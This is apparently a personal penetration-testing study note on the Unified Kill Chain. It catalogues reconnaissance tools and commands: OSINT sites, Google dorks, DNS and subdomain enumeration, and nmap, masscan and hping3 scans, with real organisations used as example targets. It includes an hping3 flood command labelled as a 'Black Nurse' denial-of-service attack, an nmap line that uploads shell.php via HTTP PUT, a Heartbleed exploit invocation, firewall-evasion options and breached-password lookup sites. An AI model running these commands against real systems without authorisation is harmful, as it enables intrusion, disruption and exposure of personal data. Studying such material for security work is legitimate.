---
{"dg-publish":true,"permalink":"/the-unified-kill-chain/"}
---

![Pasted image 20240317220256.png](/img/user/Pasted%20image%2020240317220256.png)

| #   | Attack Phase         | Description                                                                                          |
| --- | -------------------- | ---------------------------------------------------------------------------------------------------- |
| 1   | Reconnaissance       | Researching, identifying and selecting targets using active or passive reconnaissance.               |
| 2   | Resource Development | Preparatory activities aimed at setting up the infrastructure required for the attack.               |
| 3   | Delivery             | Techniques resulting in the transmission of a weaponized object to the targeted environment.         |
| 4   | Social Engineering   | Techniques aimed at the manipulation of people to perform unsafe actions.                            |
| 5   | Exploitation         | Techniques to exploit vulnerabilities in systems that may, amongst others, result in code execution. |
| 6   | Persistence          | Any access, action or change to a system that gives an attacker persistent presence on the system.   |
| 7   | Defense Evasion      | Techniques an attacker may specifically use for evading detection or avoiding other defenses.        |
| 8   | Command & Control    | Techniques that allow attackers to communicate with controlled systems within a target network.      |
| 9   | Pivoting             | Tunneling traffic through a controlled system to other systems that are not directly accessible.     |
| 10  | Discovery            | Techniques that allow an attacker to gain knowledge about a system and its network environment.      |
| 11  | Privilege Escalation | The result of techniques that provide an attacker with higher permissions on a system or network.    |
| 12  | Execution            | Techniques that result in execution of attacker-controlled code on a local or remote system.         |
| 13  | Credential Access    | Techniques resulting in the access of, or control over, system, service or domain credentials.       |
| 14  | Lateral Movement     | Techniques that enable an adversary to horizontally access and control other remote systems.         |
| 15  | Collection           | Techniques used to identify and gather data from a target network prior to exfiltration.             |
| 16  | Exfiltration         | Techniques that result or aid in an attacker removing data from a target network.                    |
| 17  | Impact               | Techniques aimed at manipulating, interrupting or destroying the target system or data.              |
| 18  | Objectives           | Socio-technical objectives of an attack that are intended to achieve a strategic goal.               |
![Pasted image 20240317220153.png](/img/user/Pasted%20image%2020240317220153.png)
# 1 Reconnaisance
Researching, identifying and selecting targets using active or passive reconnaissance.
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Indirect contact with objetive
- Looking up DNS records of a domain from a public DNS server.
- Checking job ads related to the target website.
- Reading news articles about the target company.
- Recopilar información
- Descartar la info inutil
# Main Tools
## Web-check
- https://web-check.xyz
## Maltego
- https://www.maltego.com/
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



| Option                                 | Description         |
| -------------------------------------- | ------------------- |
| `recon-ng`                             | join                |
| `marketplace info all`                 | show all modules    |
| `marketplace install hackertarget`     | Install modulñe     |
| `marketplace install hackertarget`     | Install all modules |
| `db insert domains unamizales.edu.com` | insert domain       |
| `show options`                         |                     |
| `modules load hackertarget`            | Load module         |
| `run`                                  | Run module          |
D means need dependeicies
K means require an API

```
marketplace install hackertarget
	modules load hackertarget
	show options
	option set source tesla.com
	info
	input
	run
```

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- search for emails powned
- raidforum
- Could be active!!!

| Option                                       | Description                      |
| -------------------------------------------- | -------------------------------- |
| `theharvester -d tesla.com -l 100 -b google` | General example                  |
| `-e mail`                                    | Search if email has been filtred |
| `-ef file_of_mails`                          | Search emails from files         |
| `-d domain`                                  | Search emails on the domain      |




</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



pentest-tools.com

| **Filter**                             | **Example**                            | **Description**                                                                                                                    |
| -------------------------------------- | -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| site                                   | site:tryhackme.com                     | returns results only from the specified website address                                                                            |
| site:tryhackme.com admin               | site:tryhackme.com admin               | only return results from the [tryhackme.com](http://tryhackme.com) website which contain the word admin in its content.            |
| -site:www.domain.com site:*.domain.com | -site:www.domain.com site:*.domain.com | shows us only subdomain names belonging to domain.com.                                                                             |
| inurl                                  | inurl:admin<br>inurl:wp-config.php.txt | returns results that have the specified word in the URL<br>Busca el contenido proporcionado sobre la URL. (bk of conf file of php) |
| filetype                               | filetype:pdf                           | returns results which are a particular file extension                                                                              |
| intitle                                | intitle:admin                          | returns results that contain the specified word in the title<br>Busca el contenido proporcionado sobre el título del sitio.        |
| intext                                 | intext:webpage.com                     | Busca el contenido dentro del texto del sitio.                                                                                     |
| filetype                               | filetype:txt                           | Tipo de archivo a buscar. (txt)                                                                                                    |
| "enable secret"                        | "enable secret"                        | solo busca esta palabra "enable secret"                                                                                            |
| ext                                    | ext:cfg                                | Solo busca esta extensión cfg                                                                                                      |
| -cisco.com                             | -cisco.com                             | no quiero que busque en la web cisco                                                                                               |
| `site:*.webpage.com`                   | `site:*.linux_page.org`                | Search for subdomains                                                                                                              |
# Description
- Google Dorks / Google Hacking DB
- Indexar todos los sitios web publicados en internet.
- Recaba información de cada uno de estos portales de manera recursiva basado en una serie de reglas propias de cada buscador.
- Un problema común es que los administradores con poca experiencia o de manera negligente, dejan recursos privado o confidencial disponibles los cuales pasan a formar parte de la información a las personas que realizan búsquedas.
- Los dorks son operadores para refinar las búsquedas y acotar los resultados, pueden ser usado de forma maliciosa  en busca de información expuesta públicamente por error
- Google no solo permite realizar búsqueda en textos de las páginas (intext), también URL(inurl) y en los enlaces páginas tienen (link)



</div></div>

## SpiderFoot
- https://github.com/smicallef/spiderfoot
## FOCA
# WHOIS and DNS
- Search dns domain
```sh
curl -s "http://web.archive.org/cdx/search/cdx?url=*.umanizales.edu.co/*&output=text&fl=original&collapse=urlkey" | sort | sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | uniq
```
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



```shell
whois webpage.com
```
- Allows you to query **who** a **domain name** is **registered** to
- request and response protocol that follows the [RFC 3912](https://www.ietf.org/rfc/rfc3912.txt) specification.
- Domain registrar is responsible for maintaining the WHOIS records for the domain names it is leasing
- Get the DNS servers from the registrar.
- Exits online tools too
- A WHOIS server listens on [[Networking/TCP\|TCP]] port 43 for incoming request and replies with various information related to the domain requested.
	- **Registrar**: Via which registrar was the domain name registered?
	- **Contact info of registrant**: Name, organization, address, phone, among other things. (unless made hidden via a privacy service)
	- **Creation, update, and expiration dates:** When was the domain name first registered? When was it last updated? And when does it need to be renewed?
	- **Name Server:** Which server to ask to resolve the domain name?




</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



```sh
nslookup webpage.com
```

| Option                                                                                 | Description                                                                    |
| -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| `nslookup webpage.com`                                                                 | Basic usage                                                                    |
| `nslookup OPTION webpage.com SERVER`                                                   | With options                                                                   |
| `OPTION`                                                                               |                                                                                |
| A                                                                                      | IPv4 Addresses                                                                 |
| AAAA                                                                                   | IPv6 Addresses                                                                 |
| CNAME                                                                                  | Canonical Name                                                                 |
| MX                                                                                     | Mail Servers                                                                   |
| SOA                                                                                    | Start of Authority                                                             |
| TXT                                                                                    | TXT Records                                                                    |
| `SERVER`                                                                               | is the DNS server to query.<br>Choose any local or public DNS server to query. |
| `nslookup -type=A tryhackme.com 1.1.1.1`<br>``nslookup -type=a tryhackme.com 1.1.1.1`` | E. g.                                                                          |
- Name Server Look Up.
- Find the IP address of a domain name

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">




| Option                         | Description                                                                                                                                                                          |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `dig @SERVER DOMAIN_NAME TYPE` | SERVER is the DNS server that you want to query.<br>DOMAIN_NAME is the domain name you are looking up.<br>TYPE contains the DNS record type, as shown in the table provided earlier. |
| `dig google.com @1.1.1.1`      | Basic usage                                                                                                                                                                          |
| `dig tryhackme.com MX`         | Use some query types                                                                                                                                                                 |
| A                              | IPv4 Addresses                                                                                                                                                                       |
| AAAA                           | IPv6 Addresses                                                                                                                                                                       |
| CNAME                          | Canonical Name                                                                                                                                                                       |
| MX                             | Mail Servers                                                                                                                                                                         |
| SOA                            | Start of Authority                                                                                                                                                                   |
| TXT                            | TXT Records                                                                                                                                                                          |
- Allows us to manually query recursive DNS servers of our choice for information about domains:
- Domain Information Groper,
- For more advanced DNS queries and additional functionality,
- The TTL can be found in the second column of the answer section:
![Results demonstrating that the TTL of the DNS record is 157](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/TTL.png)
It's important to remember that TTL (in the context of DNS caching) is measured in _seconds,_ so the record in the example will expire in two minutes and thirty-seven seconds.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Search subdomains
- DNS graphs
- Info about listening servers
- https://dnsdumpster.com/

</div></div>

## NS.TOOLS
- https://ns.tools/
## Viewdns
- https://viewdns.info/

# Subdomains
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Show protection tec, subdomain, if it's ptotected

| Option                      | Description  |
| --------------------------- | ------------ |
| `fierce --domain tesla.com` | Basic search |



</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- https://github.com/huntergregal/Sublist3r
- Enumerate subdomains of websites using OSINT.
- Use Google, Yahoo, Bing, Baidu and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS.

```sh
./sublist3r.py -d acmeitsupport.thm
```



</div></div>

## Phonebook
https://phonebook.cz/
## Wayback machine
https://wayback-api.archive.org/
## archive org
- https://archive.org/web/ 
# Network
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- https://www.shodan.io/
- Buscador de dispositivos conectados a la red
- Como routers, switches, raspberry pi, Scada, endpoints, etc,
- IP address, hosting company, geographic location, server type and version
- Try searching for the IP obtained from search
- Se pueden filtrar para buscar vulnerabilidades.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- https://censys.com/
- Host and certificates search, ports

</div></div>

## Wigle
- show wifi signals
- https://wigle.net/
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



If exist a web application  firewall, show it

	wafw00f http://www.tesla.com

</div></div>

# Find emails
- https://intelx.io/
- https://clearbit.com/
- https://hunter.io/

# Email checker
- https://www.verifyemailaddress.org/
- https://email-checker.net/

# Password finder
- https://www.dehashed.com/
- www.hackwise.mx

# Pic recon
- https://pimeyes.com/en
- https://tineye.com/
- https://www.zoomeye.hk/
## ![[Footprinting tools\|Footprinting tools]]
# AWS recon
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS.
- The format of the S3 buckets is http(s)://**{name}.**[**s3.amazonaws.com**](http://s3.amazonaws.com/) where {name} is decided by the owner, such as 
```
http://webpage-assets.s3.amazonaws.com
```

examples:
**{name}**-assets, **{name}**-www, **{name}**-public, **{name}**-private,

</div></div>

# Intelligence
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Open source inteligence
- Media
- Internet
- Public Government Data
- Corporate/academo publishing
- Literature




</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Human inteligent
get info with Personal contact
- POW (prisioners of war) 
- Refugees
- Accredited diplomats
- Traveler interview

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Get info from signals

### COMINT
- From intercept comunications

### ELINT
- Obtained from electronics
- radar lidar

### FISINT

- Foreign Instrumentation signals Intelligence
- Get info from no human communication systems
- Sound
- Morze



</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Satellites
- Foreign equipment, weapons, media, papers

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Satellite images
- Maps
- Military images
- GPS waypoints

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Visual Photo
- Infrared sensors
- Radar (SAR)
- LASER
- Electro optics

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Measurement ans signature 
- LASER
- Acoustic
- Infrered


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Spy person


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Financial
- Banks

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Social media inteligence

</div></div>

# Extra
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Cyber counterintelligent
- [[Defensive Security/Honeypot\|Honeypot]]
- passive DNS Monitor
- Online web trackers
- Fake online forums
- Fake reports

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Indicator of attack
code execution
persistence
c2
lateral moves

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Indicadors of compromises
- Commercial and industrial sources
- Free IoC sources
- Malware
- signatures
- exploits
- vulns
- IPs

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Carrot
- intelx.io

</div></div>

## Common objetives
- Support personal
- Technical support
- System admin
- Users and clients
- Providers of organization
- High owners
## Impact
- Economic
- Confidence damage
- Privacy lose
- Terrorist danger
- Demands
- Temporal or permanent close

## Vuln behavior of attacks
- Autority
- Urgence
- Intimidation
- Familiarity or enjoy
- Social test
- Confidence
- scarcity
- greed

## Factor to make vulnerable a business
- Insufficient info in cyber security
- No regulated access to info
- Some merged organizations
- No security policy 

## Effectiveness
1. Security policy are than strong like the weakest link
2. Hard to identify this attacks
3. No method to ensure complete security in front this threat
4. No softwre or hardware to defend against the threat

## Clasification
- Pretexting
Create a cause (like baby)
- Baiting
USB malsawe
- Tailgating
Set access to pass doors
- Phishing
Cheat the user with mail, SMS, chat
- Dumper diving
Search in garbage
- Shoulder surfing
Spy upper shoulder 
- Vishing
Call phishing
- Social Network
Get public info from this nets

## Mail attacks
1. Supplanting domain
2. Sensationalist 
3. CEO Cheat
4. Smishing
SMS
5. Spear pishing
Try cheat user to get info 
6. Vishing
False calls
7. Scam
Try cheat with gifts, job offers
8. Sextortion
Cheat with sexual fake info

## Active
- Direct contact with objetive
- Connecting to one of the company servers such as HTTP, FTP, and SMTP.
- Calling the company in an attempt to get information (social engineering).
- Entering company premises pretending to be a repairman.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Detect Host, live host, IP, OS, arch, services, vulns

 To know my gateway

	route -n

Use pentestbox, tool with the main tools
If we have a lot of machines to scan, use digitalocean
# DNS subdomain enum
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- method of trying different possible subdomains from a pre-defined list of commonly used subdomains.
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- What domain, services, servers are asosiated with this domain

| Option                           | Description                                          |
| -------------------------------- | ---------------------------------------------------- |
| `dnsrecon -t brt -d webpage.com` | General search                                       |
| `-t std`                         | Standar                                              |
| `-t axfr`                        | Zone transfer, ask for get information like a backup |
| `-D dic_file.txt`                | Use a dictionary dic                                 |


</div></div>



</div></div>


## SSL TSL Check certificates
- Secure Sockets Layer/Transport Layer Security
- These are publicly accessible logs of every SSL/TLS certificate created for a domain name.
- When an SSL/TLS certificate is created for a domain by a CA (Certificate Authority)
- CA's take part in what's called "Certificate Transparency (CT) logs"
- The purpose of CT logs is to stop malicious and accidentally made certificates from being used.
- discover subdomains belonging to a domain, sites like below offer a searchable database of certificates that shows current and historical results.
		[https://crt.sh](http://crt.sh)
		[https://ui.ctsearch.entrust.com/ui/ctsearchui](https://ui.ctsearch.entrust.com/ui/ctsearchui) o
		https://certificate.transparency.dev/
		https://github.com/UnaPibaGeek/ctfr

```sh
openssl s_client -servername webpage.com -connect webpage.com:443 2>/dev/null
```

```sh
sslscan webpage.com
```

Active vulns scan
```sh
sslyze webpage.com
```

```sh
nmap --script ssl-heartbleed -p443 IP
```
### Hearbleed vuln
checker exploit
https://github.com/vulhub/vulhub/blob/master/openssl/CVE-2014-0160/ssltest.py
```python
python3 ssltest.py 127.0.0.1 -p 8443 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- abuses of Certificate Transparency logs to get dns info.
- https://github.com/UnaPibaGeek/ctfr

| Option                          | Description |
| ------------------------------- | ----------- |
| `python ctfr.py -d webpage.com` | Basic usage |


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Some subdomains aren't always hosted in publically accessible DNS results such as development versions of a web application or administration portals. 
- Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their
- `/etc/hosts` file (or `c:\windows\system32\drivers\etc\hosts` file for Windows users) which maps domain names to IP addresses. 

- Because web servers can host multiple websites from one server when a website is requested from a client
- the server knows which website the client wants from the **Host** header.
- We can utilize this host header by making changes to it and monitoring the response to see if we've discovered a new website.

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# Subdomain virtual host (subdomains)
Subdomain virtual host
```shell
wfuzz -c -w tempdic3.txt -H "Host: FUZZ.page.com" -u http://10.10.24.58  
```
```shell
wfuzz -c --hc=403 -t 20 -w /usr/share/SecList/Discovery/DNS/subdomains...txt -H "Host: FUZZ.page.com" https://page.com
```

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## vhost mode (subdomains)
vhost e.g.
Virtual hosts are different websites on the same machine. In some instances, they can appear to look like sub-domains, but don't be deceived!
```sh
gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

```sh
gobuster vhost -u https://webpage.com -w /usr/share/SecList/Discovery/DNS/subdomains...txt -t 20 | grep -v "403"
```

RUn loop for two vhosts
```sh
for vhost in products learning; do gobuster dir -u http://${vhost}.webenum.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt -t50 ; done
```

</div></div>


</div></div>

# [[Networking/ping\|ping]]
# [[Networking/traceroute\|traceroute]]
# [[Networking/Telnet\|Telnet]]
# [[Networking/netcat\|netcat]]
# Network enum
TCP Connect / Full open scan
- Scan all ports and try to connect each one
- Don't requier superuser permition
- Send a RST

Stealth scan / Half open scan
- Try to force the connection

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



explorar redes locales y descubrir dispositivos conectados a través de ARP (Address Resolution Protocol).
```sh
sudo arp-scan --localnet
```

| Switch | Function |
| ---- | ---- |
| `-I interfacename` | Select interface |
| `--ignoredups` | ignore duplicates |
| `192.168.1.1-20` | Ip range |


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- net inventory, admin service updates, check host and service activity.
- Default tcp ports
- SYN scans are the default scans used by Nmap _if run with sudo permissions_. If run **without** sudo permissions, Nmap defaults to the TCP Connect scan we saw in the previous task.

| Opction                                                                                                      | Description                                                                                                                                                                                                                                                                                                               |
| ------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.26.222 -oG allPorts`<br>`extractPorts allPorts` | Ports scan                                                                                                                                                                                                                                                                                                                |
| `sudo nmap -sCV -p22,80,8888 10.129.26.222 -oN targeted`                                                     | Focused scan                                                                                                                                                                                                                                                                                                              |
| `nmap 192.168.0.1`<br>`nmap host.com`                                                                        | Get live hosts, open ports, services, packet types, firewalls, info of OS and versions.                                                                                                                                                                                                                                   |
| `nmap -iL list_of_hosts.txt`                                                                                 | Provide a file as input for your list of targets                                                                                                                                                                                                                                                                          |
| `nmap -sL TARGETS`                                                                                           | List of the hosts that Nmap will scan without scanning them                                                                                                                                                                                                                                                               |
| `-sS`                                                                                                        | Silent, TCP [[Networking/Seguridad en redes/Fabricación y manipulación de paquetes/SYN scan\|SYN scan]], Stealthy, Fast                                                                                                                                                                                                                                                                                  |
| `-sT`                                                                                                        | TCP Connect Scans [[Networking/Seguridad en redes/Fabricación y manipulación de paquetes/three-way handshake\|three-way handshake]]                                                                                                                                                                                                                                                                                 |
| `-v`                                                                                                         | Verbose                                                                                                                                                                                                                                                                                                                   |
| `-sCV`                                                                                                       | like -sV + -sC                                                                                                                                                                                                                                                                                                            |
| `-sV`                                                                                                        | Deep scan, try to ger services and versions running on open ports                                                                                                                                                                                                                                                         |
| `-sC`                                                                                                        | Scan with the default Nmap scripts                                                                                                                                                                                                                                                                                        |
| `--script=vuln`                                                                                              | activate all of the scripts in the "vuln" category                                                                                                                                                                                                                                                                        |
| `-A`                                                                                                         | Enable OS detection, version detection, script scanning, and traceroute                                                                                                                                                                                                                                                   |
| `-O`                                                                                                         | Try to get OS                                                                                                                                                                                                                                                                                                             |
| `-F`                                                                                                         | Fast                                                                                                                                                                                                                                                                                                                      |
| `-T4`                                                                                                        | Speed levels 1-5                                                                                                                                                                                                                                                                                                          |
| `-Pn`                                                                                                        | Disable host discovery and scan for open ports                                                                                                                                                                                                                                                                            |
| `-n`                                                                                                         | DIsable DNS resolution (more fast)                                                                                                                                                                                                                                                                                        |
| `nmap --open`                                                                                                | Just show open ports                                                                                                                                                                                                                                                                                                      |
| `-oG`                                                                                                        | Grepable output                                                                                                                                                                                                                                                                                                           |
| `-oA`                                                                                                        | save the nmap results in three major formats                                                                                                                                                                                                                                                                              |
| `-vv`<br>`-vvv`                                                                                              | More verbose                                                                                                                                                                                                                                                                                                              |
| `nmap 192.168.1.1/24`                                                                                        | Scan all devices and port, OPEN at the same time                                                                                                                                                                                                                                                                          |
| `nmap 192.168.0.1 192.168.0.4 192.168.0.7`                                                                   | Some IPs                                                                                                                                                                                                                                                                                                                  |
| `nmap 192.168.0.1-34`                                                                                        | Range of IPs                                                                                                                                                                                                                                                                                                              |
| `nmap IP -p 80`<br>`nmap IP -p80`                                                                            | Specific port                                                                                                                                                                                                                                                                                                             |
| `nmap IP -top-ports 2000`                                                                                    | 2000 Most used ports                                                                                                                                                                                                                                                                                                      |
| `nmap -p 1-77`<br>`nmap -p1-77`                                                                              | From 1 to 77                                                                                                                                                                                                                                                                                                              |
| `nmap -p 22,80`                                                                                              | port 22 and 80                                                                                                                                                                                                                                                                                                            |
| `nmap -p- IP`                                                                                                | All 65535 ports                                                                                                                                                                                                                                                                                                           |
| `nmap -p22 192.168.0.1 -D 192.168.0.2,192.168.0.3`                                                           | Decoy, eject a scan with multiple fake sources                                                                                                                                                                                                                                                                            |
| `-sU`                                                                                                        | UDP protocol<br>- When a packet is sent to an open UDP port, there should be no response. When this happens, Nmap refers to the port as being `open\|filtered`<br>- When a packet is sent to a _closed_ UDP port, the target should respond with an ICMP (ping) packet containing a message that the port is unreachable. |
| `--min-rate 5000`                                                                                            | set a min of packets per second before to skip the scan (recommend 5000)                                                                                                                                                                                                                                                  |
| `nmap -sn 192.168.1.0/24`<br>`nmap -sn 192.168.0.1-254`<br>`nmap -sn 192.168.0.0/24`                         | Barrido Ping ICMP<br>Scan any ports -- forcing it to rely primarily on ICMP echo packets<br>Also cause nmap to send a TCP SYN packet to port 443, as well as a TCP ACK (or TCP SYN if not run as root) packet to port 80 of the target.                                                                                   |
| `sN`                                                                                                         | TCP Null Scans (TCP request is sent with no flags set at all, target host should respond with a RST if the port is closed)                                                                                                                                                                                                |
| `-sF`                                                                                                        | TCP FIN Scans (a request is sent with the FIN flag, expects a RST if the port is closed.)                                                                                                                                                                                                                                 |
| `sX`                                                                                                         | TCP Xmas Scans (send a malformed TCP packet and expects a RST response for closed ports.)                                                                                                                                                                                                                                 |
![Pasted image 20240708081910.png|200](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020240708081910.png)
# Firewall evasion

| Option                                                        | Description                              |
| ------------------------------------------------------------- | ---------------------------------------- |
| `-f`                                                          | Fragmented                               |
| `nmap --mtu 16`                                               | Change MTU (8 multiple)                  |
| `--source-port 53`                                            | Change src port to 53                    |
| `--data-length 21`                                            | Manipulate data length 58 +21            |
| `--spoof-mac Dell -Pn`<br>`--spoof-mac 00:11:22:33:44:55 -Pn` | Change MAC                               |
| `--scan-delay <time>ms`                                       | add a delay between packets sent         |
| `--badsum`                                                    | generate in invalid checksum for packets |
# Scripts
ftp-anon.nse - to check anonimos ftp account
http-robots.txt.nse to check relevant info about robots files
## Categories
- **default** gran cantidad de scripts de reconocimiento básicos y útiles para la mayoría
- **discovery** descubrir información sobre la red, detección de hosts, dispositivos activos y resolución de nombres de dominio.
- **safe** scripts seguros y que no realizan actividades invasivas
- **intrusive** invasivos que pueden ser detectados fácilmente, pueden proporcionar información valiosa sobre vulnerabilidades y debilidades en la red.
- **vuln** detección de vulnerabilidades y debilidades en los sistemas y servicios que se están ejecutando en la red.

| Option                                                                                                               | Description                                                   |
| -------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| `locate .nse \| grep typeofscript`                                                                                   | Search specific scripts                                       |
| `-sC`                                                                                                                | To execute main Scripts                                       |
| `-sCV`                                                                                                               | like -sV + scripts                                            |
| `--script=<script-name>`<br>`--script=scrpt1,scrpt2`                                                                 | To run a specific script                                      |
| `--script`                                                                                                           | activate a script                                             |
| `--script=vuln`                                                                                                      | activate all of the scripts in the "vuln" category            |
| `--script="vuln and safe" -sV`                                                                                       | Use the scripts in the "vuln and safe" category               |
| `nmap -p- --script vuln IP`                                                                                          | find vulns in all ports (/usr/share/nmap/scripts) (Intrusive) |
| `--script-args`                                                                                                      | Some scripts require arguments                                |
| `http-put`<br>`nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'` | to upload files using the PUT method                          |
| `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.159.45`                                           | Enum SMB share                                                |
Categories
- `safe`:- Won't affect the target
- `intrusive`:- Not safe: likely to affect the target  
- `vuln`:- Scan for vulnerabilities
- `exploit`:- Attempt to exploit a vulnerability
- `auth`:- Attempt to bypass authentication for running services (e.g. Log into an FTP server anonymously)
- `brute`:- Attempt to **bruteforce** credentials for running services
- `discovery`:- Attempt to query running services for further information about the network (e.g. query an SNMP server).
## Emun SMB shares
```shell
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.159.45
```
## Enum NFS rpcbind
```shell
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.159.45
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Noisy

| Option                         | Description    |
| ------------------------------ | -------------- |
| `sudo netdiscover -r IP/24`    | General search |
| `netdiscover -i eth0 -r IP/24` | Set interface  |
|                                |                |


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



fast scanner

| Option                                                                | Description    |
| --------------------------------------------------------------------- | -------------- |
| `massscan -21,22,139,445,80,8080,443 -Pn 192.168.0.0/16 --rate=10000` | General search |
| `-e interface`                                                        | Set interface  |


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Para hacer ping avanzados y escanear puertos
``` bash
sudo hping3 -S --scan 1-65535 IP
```

Ping

	sudo hping3 www.lesand.cl
Escaneo de puertos(80) usando el flag SYN de TCP

	sudo hping3 -S -p 80 lesand.cl
SI la respuesta es una flag SA (SYN,ACK) comunicación ha sido aceptada, puerto abierto (open) y escuchando (listening).
SI la respuesta es una flag RA (RST,ACK) comunicación no se ha realizado correctamente porque el puerto está cerrado o filtrado.
URG (Urgent)
	the data contain in the packet should be processed immediately
PSH (push)
	Used to instruct the sending system to send all buffered data immediately
FIN (Finish)
	It tells to remote system that there will be no more transmissions

Escaneo de puertos(22) usando el flag SYN de TCP

	sudo hping3 -S -p 22 lesand.cl
Escaneo SYN especificando el número de paquetes

	sudo hping3 -S -p 80 -c 3 lesand.cl
Escaneo de puertos

	sudo hping3 -S --scan 22,23,80 lesand.cl
Modificar los paquetes que enviamos e introducir los paquetes un mensaje personalizado

	sudo hping3 192.168.1.88 -d 4 -E archivo.txt
 Ejecutar ataque Black Nurse

	sudo hping3 -C 3 -K 3 --flood 192.168.1.109
Cancelar ataque

	Ctrl+c
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



![](https://muirlandoracle.co.uk/wp-content/uploads/2020/03/image-2.png)
![](https://i.imgur.com/ngzBWID.png)

- This request contains something called a _SYN_ (short for _synchronise_) bit, which essentially makes first contact in starting the connection process.
- The server will then respond with a packet containing the **SYN** bit, as well as another "acknowledgement" bit, called _ACK_. 
- Finally, your computer will send a packet that contains the **ACK** bit by itself, confirming that the connection has been setup successfully.

</div></div>

![](https://i.imgur.com/vUQL9SK.png)

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



SYN scans sends back a RST TCP packet after receiving a SYN/ACK from the server
![](https://i.imgur.com/cPzF0kU.png)
![](https://i.imgur.com/bcgeZmI.png)
advantages
- It can be used to bypass older Intrusion Detection systems as they are looking out for a full three way handshake. This is often no longer the case with modern IDS solutions; it is for this reason that SYN scans are still frequently referred to as "stealth" scans.
- SYN scans are often not logged by applications listening on open ports, as standard practice is to log a connection once it's been fully established. Again, this plays into the idea of SYN scans being stealthy.
- Without having to bother about completing (and disconnecting from) a three-way handshake for every port, SYN scans are significantly faster than a standard TCP Connect scan.

There are, however, a couple of disadvantages to SYN scans, namely:

- They require sudo permissions[1] in order to work correctly in Linux. This is because SYN scans require the ability to create raw packets (as opposed to the full TCP handshake), which is a privilege only the root user has by default.
- Unstable services are sometimes brought down by SYN scans, which could prove problematic if a client has provided a production environment for the test.

SYN scans are the default scans used by Nmap _if run with sudo permissions_. If run **without** sudo permissions, Nmap defaults to the TCP Connect scan we saw in the previous task.

Si un puerto está cerrado, el servidor responde con un paquete TCP RST. Si el puerto está filtrado por un cortafuegos, el paquete TCP SYN se descarta o se falsifica con un reinicio TCP.


</div></div>



</div></div>

## Netscantools Pro
- Like nmap
## Zenmap
- Like nmap for windows, portable
## 
